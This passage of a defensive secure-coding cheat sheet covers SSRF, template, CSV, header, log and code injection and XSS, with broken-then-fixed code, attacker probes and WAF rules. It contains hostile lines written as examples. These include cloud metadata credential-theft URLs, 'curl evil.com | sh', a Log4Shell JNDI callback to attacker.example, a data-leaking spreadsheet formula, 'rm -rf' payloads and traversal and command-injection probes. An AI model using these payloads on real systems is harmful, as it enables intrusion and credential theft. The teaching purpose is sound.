ERB's "safe_eval" mode (`$SAFE`) is removed in Ruby 3.0 — there's no sandbox. Don't render user-supplied ERB.

## Server-Side Template Injection — Twig / Smarty / Handlebars

Twig (PHP), Smarty (PHP), Handlebars (Node) all have "sandbox" modes with allowlisted helpers. Helpers and global functions are bypass paths.

```bash
Twig sandbox bypass    — twig.constant() leaks PHP constants; sort() with closure
Smarty bypass          — {math equation="..."} historically eval'd
Handlebars bypass      — older versions (<= 4.7.6) had prototype pollution → RCE
```

The defense pattern: do not render user templates. If you must (multi-tenant template editing), run the renderer in a separate process with no filesystem or network access (containerized, seccomp-restricted, network-namespaced). Treat it like running untrusted code, because it is.

## SSRF — Python requests

```python
# Broken — passes URL straight through
import requests
r = requests.get(request.args["url"])
return r.text
# Attacker submits: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → cloud metadata endpoint with IAM creds returned to the attacker.
# Or: http://localhost:8080/admin   → reaches internal services.
```

```python
# Fixed — validate scheme + resolved IP, re-resolve before request
import ipaddress
import socket
from urllib.parse import urlparse
import requests

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def safe_get(url: str) -> requests.Response:
    p = urlparse(url)
    if p.scheme not in {"http", "https"}:
        raise ValueError("scheme not allowed")
    if p.hostname not in ALLOWED_HOSTS:
        raise ValueError("host not allowed")
    # Resolve once and pin to the IP
    ip = socket.gethostbyname(p.hostname)
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local \
       or addr.is_multicast or addr.is_reserved:
        raise ValueError("private/internal IP")
    # Send with explicit Host header so TLS still validates the original name
    new_url = p._replace(netloc=ip + (f":{p.port}" if p.port else "")).geturl()
    headers = {"Host": p.hostname}
    return requests.get(new_url, headers=headers, timeout=5,
                        allow_redirects=False)
```

`allow_redirects=False` is critical — otherwise the attacker returns a `301 Location: http://169.254.169.254/...` and the client follows. Either disable redirects or revalidate every redirect target.

## SSRF — Go net/http

```go
// Fixed — custom Transport with DialContext IP allowlist
import (
    "context"
    "errors"
    "net"
    "net/http"
    "time"
)

func safeTransport() *http.Transport {
    return &http.Transport{
        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
            host, port, err := net.SplitHostPort(addr)
            if err != nil {
                return nil, err
            }
            ips, err := net.DefaultResolver.LookupIP(ctx, "ip", host)
            if err != nil {
                return nil, err
            }
            for _, ip := range ips {
                if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() ||
                    ip.IsLinkLocalMulticast() || ip.IsMulticast() ||
                    ip.IsUnspecified() {
                    return nil, errors.New("private IP not allowed")
                }
            }
            d := net.Dialer{Timeout: 5 * time.Second}
            return d.DialContext(ctx, network, net.JoinHostPort(ips[0].String(), port))
        },
    }
}

client := &http.Client{
    Transport: safeTransport(),
    Timeout:   10 * time.Second,
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        return http.ErrUseLastResponse  // do not follow redirects
    },
}
```

The DialContext check happens for **every** TCP connection the client makes — including redirects, including DNS rebinding (the second resolution after a different first response). It's the strongest layer because it enforces "the actual IP we're connecting to is on the allowlist."

## SSRF — Cloud Metadata Endpoint

The cloud metadata endpoint at `169.254.169.254` (and the IPv6 equivalent `fd00:ec2::254` on AWS) historically required no authentication. The IMDSv1 design "if you can reach it, you can read it" turned every SSRF into IAM credential theft.

```bash
# IMDSv1 — historically returned credentials with no auth
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# IMDSv2 (current default for new instances) — token-based
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
```

The `X-aws-ec2-metadata-token-ttl-seconds: 21600` PUT is hard for an SSRF to forge — most app HTTP libraries don't send PUTs by default. IMDSv2 turns SSRF-to-IAM into a much narrower attack class.

GCP requires `Metadata-Flavor: Google` header. Azure requires `Metadata: true` header and uses 169.254.169.254 too. All can be enforced as required headers; defense-in-depth: also block the IP at the network layer if your app doesn't legitimately need metadata.

## SSRF — DNS Rebinding

DNS rebinding works like this:

```bash
1. Attacker's DNS server returns A record: TTL 0, value 203.0.113.5  (a real public IP)
2. Server validates: 203.0.113.5 is public → passes allowlist
3. Server makes the actual HTTP request — DNS resolves AGAIN
4. This time the DNS server returns: 169.254.169.254
5. Server connects to the metadata endpoint
```

Defense: resolve once, cache the IP, attack the IP-based form (not the hostname).

```python
# Fixed — resolve, validate, then connect by IP
import socket, ipaddress
ip = socket.gethostbyname(host)
addr = ipaddress.ip_address(ip)
if addr.is_private:
    raise ValueError("blocked")
# Now use `ip` directly in the connection — DNS won't be queried again.
sock.connect((ip, port))
```

The Go `DialContext` example above already does this — the resolution happens inside the dialer with the validated IP returned, so the HTTP layer never re-resolves.

## SSRF — URL Parsing Pitfalls

```bash
http://allowed.example@evil.example/ — userinfo trick;
                                       some libs treat host as `evil.example`,
                                       others as `allowed.example`.
http://evil.example#@allowed.example/ — fragment confusion.
http://[::1]/                          — IPv6 loopback bypass of "127.0.0.1" filter.
http://0/                              — "0" is a shorthand for 0.0.0.0 / 127.0.0.1.
http://2130706433/                     — decimal-encoded 127.0.0.1.
http://0x7f000001/                     — hex-encoded 127.0.0.1.
http://017700000001/                   — octal-encoded 127.0.0.1.
http://127.0.0.1.nip.io/               — DNS service returning the embedded IP.
```

Always: parse with the standard library, extract the hostname, resolve to IP, validate the IP — not the hostname string. The hostname has too many encodings; the resolved IP is canonical.

## CSV / Formula Injection

When user input becomes a cell in a CSV that someone opens in Excel/LibreOffice/Google Sheets, leading `=`, `+`, `-`, `@` cause the cell to be evaluated as a formula. Tab and CR can chain into adjacent cells.

```bash
=cmd|'/c calc'!A1                   — Windows DDE (legacy Excel) launches calc
=HYPERLINK("https://evil/?"&A1,"x") — exfiltrates row contents on click
@SUM(1+2)                           — leading @ also triggers formula evaluation
+IMPORTXML(...)                     — Google Sheets external request
```

```python
# Broken — pandas to_csv does NOT escape formula prefixes
import pandas as pd
df = pd.DataFrame([{"name": "=cmd|'/c calc'!A1"}])
df.to_csv("out.csv", index=False)
```

```python
# Fixed — prefix dangerous values with ' (single quote escape)
def csv_safe(value: str) -> str:
    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + value
    return value

df["name"] = df["name"].map(csv_safe)
df.to_csv("out.csv", index=False, quoting=csv.QUOTE_ALL)
```

```python
# Fixed — use a library that knows about it
from openpyxl import Workbook
wb = Workbook()
ws = wb.active
ws.cell(row=1, column=1, value=user_data)  # writes as a string, not formula
```

The single-quote prefix is what spreadsheet apps treat as "this is text, not a formula." `QUOTE_ALL` doesn't help — quoting wraps the cell, but Excel still parses formula prefixes inside the quotes.

## Header Injection / CRLF

When user input becomes part of an HTTP response header without filtering, `\r\n` lets the attacker terminate the header and inject new headers — or split the response entirely.

```python
# Broken — raw user data in Set-Cookie
def login(request):
    response = make_response()
    response.headers["X-User"] = request.args["user"]
    return response
# User submits: bob\r\nSet-Cookie: admin=true\r\n\r\n<html>...
# → Response splitting: attacker's HTML rendered as the body of a "second response."
```

```python
# Fixed — modern frameworks filter control characters
# Werkzeug (Flask) raises BadRequest on \r or \n in header values.
# FastAPI/Starlette likewise rejects.
# Django http.HttpResponse[name] = value validates.

# If you must build raw, do it explicitly:
import re
def safe_header(value: str) -> str:
    if re.search(r"[\r\n\x00]", value):
        raise ValueError("invalid header value")
    return value
```

The HTTP/2 and HTTP/3 wire formats are binary-framed and immune to this — but app-level vulnerabilities can still appear if the server stack downgrades headers to HTTP/1.1 for upstream proxying without revalidating.

```bash
# Common attack — redirect splitting via Location header
# /redirect?url=http://evil%0d%0aSet-Cookie:%20stolen=1
# Server output:
#   HTTP/1.1 302 Found
#   Location: http://evil
#   Set-Cookie: stolen=1
```

Defense: the HTTP framework should reject control chars; do not implement your own header writer.

## Mail Header Injection

Same idea as HTTP CRLF, but for SMTP. `\r\n` injects `Bcc:`, `Cc:`, `To:`, `Subject:`, and even the message body.

```python
# Broken — user-controlled subject pasted into raw header
import smtplib
msg = f"From: noreply@example.com\r\nTo: {to}\r\nSubject: {subject}\r\n\r\n{body}"
smtp.sendmail("noreply@example.com", [to], msg)
# User submits subject: hello\r\nBcc: spam-victim-1, spam-victim-2, ...
# → service becomes a spam relay.
```

```python
# Fixed — use email.message.EmailMessage which validates headers
from email.message import EmailMessage
import smtplib

msg = EmailMessage()
msg["From"] = "noreply@example.com"
msg["To"] = to                   # raises ValueError on control chars
msg["Subject"] = subject          # raises ValueError on control chars
msg.set_content(body)

with smtplib.SMTP("smtp.example.com", 587) as s:
    s.starttls()
    s.login(user, pw)
    s.send_message(msg)
```

`EmailMessage.__setitem__` validates headers per RFC 5322. The legacy `email.mime.text.MIMEText` is more permissive — prefer `EmailMessage` (Python 3.6+).

For To/Cc that are user data, also validate the address with `email.utils.parseaddr` and reject anything that doesn't return exactly one parsable address.

## Log Injection

User input written verbatim to logs lets attackers forge log entries (covering tracks, fooling SIEM, fooling on-call humans).

```python
# Broken — user input in an f-string log line
import logging
logging.info(f"login failed for {username}")
# User submits username: bob\nINFO  login succeeded for admin
# → Two log lines: one real, one attacker-controlled, indistinguishable.
```

```python
# Fixed — structured logging puts user data in a separate field
import structlog
log = structlog.get_logger()
log.info("login_failed", username=username)
# Output (JSON formatter): {"event":"login_failed","username":"bob\nINFO ..."}
# The newline is a property of the JSON value, not a real log-line break.

# Fixed — stdlib logging with extra keyword
import logging
logging.info("login failed for %s", username)  # %s is escaped if formatter does
# Better: use a JSON formatter so the message is always quoted as a string field.
```

```bash
# Defense at the parser side — Loki / Splunk / Elastic configurations should
# treat each log line as one event and not parse \n inside a quoted field.
# Use newline-delimited JSON (NDJSON) or framing protocols (CBOR, length-prefix).
```

The Log4Shell / CVE-2021-44228 incident was a more severe log injection — Log4j 2.x interpreted `${jndi:...}` in log message arguments, performing JNDI lookups that could load remote classes (RCE). Fix: upgrade Log4j to 2.17.1+, or set `log4j2.formatMsgNoLookups=true`. The pattern of "logging library evaluates strings" is the root cause; structured logging never has this problem.

## Code Injection

`eval`, `exec`, `Function` constructor, `pickle.load`, `marshal.load`, `yaml.load` (without `SafeLoader`) all execute or instantiate arbitrary objects from input. If the input is attacker-controlled, the result is RCE.

```python
# Broken — "but it's a calculator"
def calc(expr): return eval(expr)
calc("__import__('os').system('rm -rf ~')")
```

```python
# Fixed — ast.literal_eval allows only literals
import ast
def calc_literal(expr):
    return ast.literal_eval(expr)  # numbers, strings, tuples, dicts, lists, bools, None
calc_literal("[1, 2, 3]")  # OK
calc_literal("__import__('os')")  # ValueError: malformed node
```

```python
# Fixed — a real expression evaluator with a fixed grammar
# Use a library (numexpr, asteval) or write a tiny Pratt parser.
import numexpr
result = numexpr.evaluate("a + b * 2", local_dict={"a": 1, "b": 2})
```

```javascript
// Broken — Function constructor IS eval
const f = new Function("x", "return " + userExpression);
f(5);

// Fixed — math.js or a small custom parser
const math = require("mathjs");
const result = math.evaluate(userExpression, { x: 5 });
```

```python
# Pickle on untrusted input is RCE — pickle.load executes object reconstruction.
import pickle
pickle.load(untrusted_stream)  # RCE if the stream contains __reduce__ tricks

# Fixed — JSON or msgpack for cross-process serialization
import json
json.loads(untrusted_stream.read())

import msgpack
msgpack.unpackb(data, raw=False, strict_map_key=True)
```

```python
# YAML — yaml.load WITHOUT SafeLoader is RCE.
import yaml
yaml.load(stream)            # Broken — supports !!python/object/apply
yaml.load(stream, Loader=yaml.SafeLoader)   # Fixed
yaml.safe_load(stream)        # Fixed (shorthand)
```

The 6.0+ versions of PyYAML deprecated `yaml.load` without an explicit Loader for exactly this reason.

## XSS — Output Encoding by Context

XSS is *output*-side injection — attacker data was stored or echoed without encoding for the HTML/JS/URL/CSS context where it lands.

The six contexts and their encoders:

```bash
HTML body                   → escape & < > " '   (and some recommend / )
HTML attribute (quoted)     → same as body, but always quote the attribute
HTML attribute (unquoted)   — DON'T. Always quote.
JS string literal           → escape \ " ' < > & + and use unicode escapes \uXXXX
JS variable (no string)     — DON'T. Use JSON.parse(...) of an HTML-encoded JSON blob.
URL parameter               → percent-encode all reserved chars (encodeURIComponent)
URL path segment            → percent-encode minus the segment separator
CSS                         → CSS escape: \HH or \HHHHHH
```

The rule "encode for the context where the data lands." A single value that ends up in HTML body and inside an `onclick` attribute needs both encodings.

## XSS — Python markupsafe / Jinja2

```python
# Fixed — Jinja2 with autoescape ON (default for templates ending in .html in Flask)
from flask import Flask, render_template
app = Flask(__name__)
# Flask autoescapes .html / .htm / .xml / .xhtml templates.

# In a template:
# <p>Hello {{ user_name }}</p>     ← auto-escaped: <, >, &, ", ' replaced
# <p>Hello {{ user_html|safe }}</p> ← bypasses escape! Use only for trusted HTML.
```

```python
# Broken — render_template_string can disable autoescape if you pass a Template
# Always use render_template; never render_template_string for user data.
return render_template("page.html", name=user_name)  # safe
return render_template_string("Hello " + user_name)   # NOT autoescaped + SSTI risk
```

```python
# markupsafe.escape — manual escape if you build HTML programmatically
from markupsafe import escape, Markup
s = escape(user_input)        # produces a Markup object (safe for re-use)
html = Markup("<p>") + s + Markup("</p>")
```

`Markup` is a marker class — when Jinja sees a `Markup` object, it skips re-escaping. Build small Markup pieces and concat them; never pass `|safe` to user data.

## XSS — Go html/template vs text/template

```go
// Fixed — html/template auto-escapes by HTML context
import "html/template"
t := template.Must(template.New("p").Parse("<p>Hello {{.Name}}</p>"))
t.Execute(w, struct{ Name string }{user})
// Outputs: <p>Hello &lt;script&gt;alert(1)&lt;/script&gt;</p>
```

```go
// Broken — text/template does NOT escape; never use for HTML output
import "text/template"
t := template.Must(template.New("p").Parse("<p>Hello {{.Name}}</p>"))
t.Execute(w, struct{ Name string }{user})
// Outputs: <p>Hello <script>alert(1)</script></p>   ← XSS
```

`html/template` is context-aware: it knows whether `{{.X}}` is in the body, an attribute, JS, or URL, and escapes appropriately. `text/template` is for non-HTML output (config files, Go code generation). Mixing them up is a common mistake — triple-check imports.

## XSS — Node + React

```jsx
// Fixed — React string children are auto-escaped
<div>{userInput}</div>            // userInput rendered as text, not HTML
```

```jsx
// Broken — dangerouslySetInnerHTML bypasses escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />   // XSS
```

```jsx
// Fixed — sanitize first if you must render HTML
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

DOMPurify configuration knobs:

```javascript
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
  ALLOWED_ATTR: ["href"],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
});
```

React's name for the prop — `dangerouslySetInnerHTML` — is a deliberately ugly API exactly so it stands out in code review.

## XSS — Java OWASP Encoder

```java
import org.owasp.encoder.Encode;

// HTML body
String safe = Encode.forHtml(userInput);

// HTML attribute
String safeAttr = Encode.forHtmlAttribute(userInput);

// JavaScript string literal
String safeJs = Encode.forJavaScript(userInput);

// JavaScript inside HTML attribute (e.g. onclick="...")
String safeJsAttr = Encode.forJavaScriptAttribute(userInput);

// JavaScript inside <script>...</script>
String safeJsBlock = Encode.forJavaScriptBlock(userInput);

// URL component
String safeUrl = Encode.forUriComponent(userInput);

// CSS string
String safeCss = Encode.forCssString(userInput);

// CSS URL
String safeCssUrl = Encode.forCssUrl(userInput);
```

The library's contract: for each named context, return a string that, when placed in that context, renders user data harmlessly. Use the right method for the right context — every wrong choice is a potential XSS.

## XSS — DOMPurify (Client-side)

When you must accept rich text from users (a comment editor, a markdown rendering pipeline) and display it as HTML, sanitize before insertion.

```javascript
import DOMPurify from "dompurify";

const dirty = "<img src=x onerror=alert(1)><p>hello</p>";
const clean = DOMPurify.sanitize(dirty);
// clean === "<p>hello</p>"  — img with onerror stripped

document.getElementById("output").innerHTML = clean;
```

For server-side rendering with the same logic, use `jsdom` + `dompurify`:

```javascript
import { JSDOM } from "jsdom";
import createDOMPurify from "dompurify";
const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);
const clean = DOMPurify.sanitize(userHtml);
```

## XSS — Content-Security-Policy

CSP is defense-in-depth — assume an injection lands and prevent the script from running.

```bash
# Strict CSP for modern apps
Content-Security-Policy: default-src 'none';
                         script-src 'self' 'nonce-rAnd0m';
                         style-src 'self' 'nonce-rAnd0m';
                         img-src 'self' data:;
                         connect-src 'self';
                         frame-ancestors 'none';
                         base-uri 'self';
                         form-action 'self';
```

```html
<!-- Each script tag must include the matching nonce -->
<script nonce="rAnd0m">
  console.log("trusted code");
</script>
```

```bash
# strict-dynamic — propagates trust to scripts loaded by trusted scripts
Content-Security-Policy: script-src 'nonce-rAnd0m' 'strict-dynamic';
```

Anti-patterns that defeat CSP:

```bash
'unsafe-inline' in script-src    — allows inline <script> tags; XSS payloads work
'unsafe-eval' in script-src       — allows eval/Function/setTimeout(string)
* in default-src                  — anyone can load resources
data: in script-src               — javascript: URIs work via data:
```

The nonce must be cryptographically random and changed per response. `'strict-dynamic'` lets you stop maintaining script source allowlists — once a trusted script loads, the scripts it loads inherit trust.

## Universal Defense Layers

```bash
1. Input validation     — allowlist (regex-with-anchors, typed schema, enum)
2. Parameterization     — at the boundary to every interpreter
3. Output encoding      — for the specific context (HTML body, attr, JS, URL, CSS)
4. Strict content types — Content-Type: application/json; charset=utf-8
                          X-Content-Type-Options: nosniff
5. Least privilege      — DB user with SELECT only; no SHELL access; no FILE perms
6. Defense in depth     — WAF, CSP, sandboxed renderers, audit logs
```

The universal failure mode: relying on **only one** of these. A regex allowlist with a parameterized query is robust. A regex allowlist alone fails when the regex misses a case. A parameterized query alone is fine for SQL but doesn't help XSS.

## Validation Patterns

```python
# Typed schema — Pydantic
from pydantic import BaseModel, Field, EmailStr
class UserCreate(BaseModel):
    email: EmailStr
    age: int = Field(ge=13, le=130)
    username: str = Field(pattern=r"^[a-zA-Z0-9_]{3,32}$")

user = UserCreate(**request.json)  # raises ValidationError on bad input
```

```javascript
// Typed schema — zod (Node)
import { z } from "zod";
const UserCreate = z.object({
  email: z.string().email(),
  age: z.number().int().min(13).max(130),
  username: z.string().regex(/^[a-zA-Z0-9_]{3,32}$/),
});
const user = UserCreate.parse(req.body);  // throws on bad input
```

```javascript
// Typed schema — joi (legacy Node)
const Joi = require("joi");
const schema = Joi.object({
  email: Joi.string().email().required(),
  age: Joi.number().integer().min(13).max(130).required(),
  username: Joi.string().pattern(/^[a-zA-Z0-9_]{3,32}$/).required(),
});
const { error, value } = schema.validate(req.body);
```

```bash
Regex DoS / catastrophic backtracking — the trap

(a+)+$        — quadratic on input "aaaaaaaaaaaaaaaaaaaa!"
(a|a)+$       — exponential backtracking
(.*a){11}     — exponential
^(.*?,){5}.*$ — pathological with nested quantifiers
```

```python
# Defense — use a regex engine that's linear time (Rust regex, RE2, Hyperscan)
# Python re is backtracking; for untrusted input, prefer:
import re2     # Google RE2 bindings
re2.match(pattern, text)

# Or set a timeout (Python 3.12+)
import re
re.match(pattern, text, timeout=0.1)  # raises TimeoutError on backtracking
```

```bash
Whitelist > blacklist:
  Whitelist — define what is allowed; reject everything else.
  Blacklist — define what is forbidden; accept everything else.

Blacklists fail because the attacker only needs to find one case you didn't think of.
Whitelists fail closed — they may reject valid input but won't accept malicious input.
```

## Cheat-by-Language Quick-Ref

| Concern | Python | Go | Node | Ruby | Java | Rust | PHP |
|---|---|---|---|---|---|---|---|
| SQL placeholder | `?` (sqlite) / `%s` (psycopg) | `$1` (pg) / `?` (mysql) | `$1` (pg) / `?` (mysql2) | `?` (AR) / `$1` (pg) | `?` (JDBC) | `?` (sqlx postgres uses `$1`) | `?` or `:name` (PDO) |
| Shell-safe exec | `subprocess.run([...], shell=False)` | `exec.Command(name, args...)` | `execFile(cmd, [args])` | `system(cmd, *args)` | `new ProcessBuilder(...)` | `Command::new(cmd).arg(a)` | `proc_open` w/ array args |
| HTML output encode | `markupsafe.escape` / Jinja2 autoescape | `html/template` | React (auto) / `escape-html` | Rails ERB autoescape | `Encode.forHtml` (OWASP Encoder) | `askama::escape` | `htmlspecialchars($s, ENT_QUOTES, 'UTF-8')` |
| JSON parse | `json.loads` | `encoding/json` Unmarshal | `JSON.parse` | `JSON.parse` | `Jackson ObjectMapper.readValue` | `serde_json::from_str` | `json_decode($s, true)` |
| Path canonicalize | `Path(p).resolve()` + `is_relative_to` | `filepath.Clean` + prefix check / `filepath.IsLocal` | `path.resolve` + prefix check | `Pathname#cleanpath` + prefix | `Path.toRealPath().startsWith(base)` | `Path::canonicalize` + prefix | `realpath()` + prefix check |

## Common Errors / IOC

What an attacker probe looks like in your logs:

```bash
# SQL injection probes
GET /search?q=' OR 1=1--
GET /search?q=1' UNION SELECT NULL,NULL,NULL--
GET /search?q=1; WAITFOR DELAY '0:0:5'--
GET /search?q=1 AND SLEEP(5)
GET /search?q=1' AND (SELECT pg_sleep(5))--

# JNDI / Log4Shell
User-Agent: ${jndi:ldap://attacker.example/exploit}
X-Api-Version: ${jndi:rmi://attacker.example/x}

# Server-side template injection probes
GET /hi?name={{7*7}}      → response contains 49 → Jinja2/Twig
GET /hi?name=${7*7}       → response contains 49 → JSP/Velocity/Thymeleaf
GET /hi?name=<%= 7*7 %>   → response contains 49 → ERB
GET /hi?name=#{7*7}       → response contains 49 → Ruby string interpolation

# XSS probes
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
'-alert(1)-'

# SSRF probes
?url=http://169.254.169.254/latest/meta-data/
?url=http://localhost:22
?url=file:///etc/passwd
?url=gopher://internal-host:6379/_FLUSHALL
?url=http://[::1]/admin

# Path traversal probes
?file=../../etc/passwd
?file=..%2F..%2Fetc%2Fpasswd
?file=....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# OS command injection probes
?host=example.com;id
?host=example.com|id
?host=example.com`id`
?host=example.com$(id)
?host=example.com&&id
```

```bash
# WAF/IDS detection ideas (ModSecurity-style)
SecRule ARGS "@rx (?i)(union\s+select|or\s+1=1|sleep\s*\(|waitfor\s+delay)"
SecRule ARGS "@rx \$\{jndi:"
SecRule ARGS "@rx (\.\.\/|\.\.\\\\)"
SecRule ARGS "@rx (?i)<script|javascript:|onerror\s*="
SecRule REQUEST_URI "@beginsWith http://169.254."
```

WAF is defense-in-depth; never the only layer. WAFs are bypassed (encoding tricks, fragment splitting, HTTP smuggling). Fix the underlying app code.

## Common Gotchas

10+ broken-then-fixed pairs from real-world stacks.

**1. Sequelize raw queries**

```javascript
// Broken
const users = await sequelize.query(`SELECT * FROM users WHERE id = ${id}`);

// Fixed
const users = await sequelize.query(
  "SELECT * FROM users WHERE id = :id",
  { replacements: { id }, type: QueryTypes.SELECT }
);
```

**2. Express body-parser type confusion (NoSQL injection)**

```javascript
// Broken — req.body.password can be { $ne: null }
const u = await User.findOne({ username: req.body.username, password: req.body.password });

// Fixed — coerce to string
const u = await User.findOne({
  username: String(req.body.username || ""),
  password: String(req.body.password || ""),
});
```

**3. Django QuerySet.extra**

```python
# Broken — .extra() with concatenated where clause
Article.objects.extra(where=[f"title = '{name}'"])

# Fixed — .extra() with params (or just .filter)
Article.objects.extra(where=["title = %s"], params=[name])
Article.objects.filter(title=name)  # cleaner
```

**4. Rails order(params[:sort])**

```ruby
# Broken — order accepts SQL fragments
Article.order(params[:sort])
# User submits: sort=(SELECT CASE WHEN (SELECT...) THEN 1 ELSE 0 END)

# Fixed — allowlist
ALLOWED = %w[id title created_at updated_at].freeze
sort = ALLOWED.include?(params[:sort]) ? params[:sort] : "id"
Article.order(sort)
```

**5. Spring Data JPA @Query with concat**

```java
// Broken
@Query("SELECT a FROM Account a WHERE a.owner = '" + "#{#owner}" + "'")
List<Account> findByOwner(@Param("owner") String owner);

// Fixed
@Query("SELECT a FROM Account a WHERE a.owner = :owner")
List<Account> findByOwner(@Param("owner") String owner);
```

**6. Go template/text used for HTML**

```go
// Broken — text/template imports for an HTML response
import "text/template"
// Fixed — html/template
import "html/template"
```

**7. PHP unserialize on user data**

```php
// Broken — unserialize on attacker input is RCE via __wakeup/__destruct gadgets
$obj = unserialize($_POST['data']);

// Fixed — JSON
$obj = json_decode($_POST['data'], true);
```

**8. Python f-string SQL still appears in raw psycopg2 paths**

```python
# Broken — even when you "know better"
cur.execute(f"DELETE FROM tokens WHERE user = '{user}'")

# Fixed
cur.execute("DELETE FROM tokens WHERE user = %s", (user,))
```

**9. Node child_process.exec for "trusted" command construction**

```javascript
// Broken — even "trusted" config can be injected via env or file
const { exec } = require("child_process");
exec(`backup ${process.env.BACKUP_TARGET}`);

// Fixed
const { execFile } = require("child_process");
execFile("backup", [process.env.BACKUP_TARGET]);
```

**10. ASP.NET Razor @Html.Raw on user data**

```csharp
// Broken — bypasses Razor's automatic encoding
@Html.Raw(Model.Comment)

// Fixed
@Model.Comment   // automatically encoded
@Html.DisplayFor(m => m.Comment)
```

**11. Flask jsonify with `JSON_AS_ASCII = False` and HTML embedding**

```python
# Broken — embedding JSON inside <script> with non-ASCII can break out
# <script>const data = {{ data|tojson }}</script>
# If data contains </script><script>alert(1)//, the </script> closes early.

# Fixed — Jinja2's |tojson filter escapes for the script context
# (it converts < to <, etc.)
# Always use |tojson, never |safe + JSON.stringify on the server side.
```

**12. PowerShell Invoke-Expression with user data**

```powershell
# Broken
Invoke-Expression "Get-Process $name"

# Fixed — use the typed cmdlet directly
Get-Process -Name $name
```

**13. Bash unquoted variable expansion**

```bash
# Broken
rm -f $user_file
# If $user_file is "; rm -rf /", that's just two commands; but if it's "* /etc",
# the glob expands to every top-level file.

# Fixed
rm -f -- "$user_file"
```

**14. Shell-out from CI scripts**

```yaml
# Broken — GitHub Actions example
- run: echo "Hello ${{ github.event.issue.title }}"
# Issue title `"; curl evil.com | sh; #` gets executed.

# Fixed — pass via env, then quote
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Hello $TITLE"
```

**15. SQL ORDER BY with raw column from URL**

```sql
-- Broken — already covered above; restated because it's everywhere.
SELECT * FROM users ORDER BY $sortColumn $sortDir
-- Fixed — see the allowlist pattern in the ORDER BY section.
```

## Idioms

The decisions that prevent injection by default:

```bash
1. Parameterize first         — every interpreter call uses prepared/bound API
2. Encode at the sink         — encode for the specific context, not at input
3. Don't trust client checks  — JS validation is UX; server must re-validate
4. Use anchored regex         — ^pattern$, not pattern (substring matches)
5. Bound everything           — string lengths, integer ranges, list sizes
6. Reject early               — validate at the edge; let the rest of the code
                                trust the data shape
7. Separate code from data    — config files use static formats (TOML, YAML safe);
                                user data uses JSON; templates are static
8. Least privilege            — DB user, file permissions, network egress
9. Defense in depth           — assume one layer fails; the next must catch it
10. Audit broken-then-fixed   — any time you see string concat into an interpreter,
                                that's the broken side; find the fixed side
```

## See Also

- python
- go
- ruby
- java
- rust
- sql
- regex
- tls

## References

- OWASP Top 10 — https://owasp.org/Top10/
- OWASP Cheat Sheet Series — https://cheatsheetseries.owasp.org/
- OWASP Injection Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP SQL Injection Prevention — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP XSS Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP XXE Prevention — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP SSRF Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP LDAP Injection Prevention — https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- OWASP File Upload — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP Java Encoder — https://owasp.org/www-project-java-encoder/
- OWASP Cheat Sheets project — https://owasp.org/www-project-cheat-sheets/
- PortSwigger Web Security Academy — https://portswigger.net/web-security
- PortSwigger SQL Injection — https://portswigger.net/web-security/sql-injection
- PortSwigger SSRF — https://portswigger.net/web-security/ssrf
- PortSwigger XXE — https://portswigger.net/web-security/xxe
- PortSwigger SSTI — https://portswigger.net/web-security/server-side-template-injection
- defusedxml — https://pypi.org/project/defusedxml/
- DOMPurify — https://github.com/cure53/DOMPurify
- Content-Security-Policy MDN — https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- CWE-89 SQL Injection — https://cwe.mitre.org/data/definitions/89.html
- CWE-78 OS Command Injection — https://cwe.mitre.org/data/definitions/78.html
- CWE-79 XSS — https://cwe.mitre.org/data/definitions/79.html
- CWE-94 Code Injection — https://cwe.mitre.org/data/definitions/94.html
- CWE-611 XXE — https://cwe.mitre.org/data/definitions/611.html
- CWE-918 SSRF — https://cwe.mitre.org/data/definitions/918.html
- CWE-1336 SSTI — https://cwe.mitre.org/data/definitions/1336.html
- RFC 4515 LDAP Filter Syntax — https://www.rfc-editor.org/rfc/rfc4515
- RFC 4514 LDAP DN — https://www.rfc-editor.org/rfc/rfc4514
- RFC 5322 Internet Message Format — https://www.rfc-editor.org/rfc/rfc5322
- AWS IMDSv2 — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
